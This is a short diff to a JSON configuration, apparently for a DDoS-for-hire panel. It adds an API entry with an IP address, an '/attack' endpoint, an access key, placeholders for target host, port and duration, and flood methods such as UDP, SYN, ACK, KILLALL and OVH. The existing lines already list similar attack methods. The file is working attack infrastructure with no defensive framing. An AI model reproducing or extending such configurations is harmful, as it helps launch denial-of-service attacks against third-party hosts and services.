@@ -6,5 +6,13 @@
         "api_maxconn": "99",
         "api_methods": "HOME-TRC,UDP-TRC,MIXAMP-TRC,TCP-TRC,NFO-TRC,OVH-TRC,SSH-TRC,GAME-TPC,FIVEM-TRC,ARK-TRC,MC-TRC,HTTPS-TRC,TLS-TRC",
         "api_funnels": ""
+    },
+    "Tyrone API": {
+        "api_toggle": "true",
+        "api_url": "http://136.175.200.25:999/attack?key=kafnb897a9g2r&method=[METHOD]&time=[TIME]&port=[PORT]&host=[HOST]",
+        "api_maxtime": "1200",
+        "api_maxconn": "99",
+        "api_methods": "DNS,UDP,TCP,SYN,ACK,KILLALL,OVH,HTTPS,STOP",
+        "api_funnels": ""
     }
 }
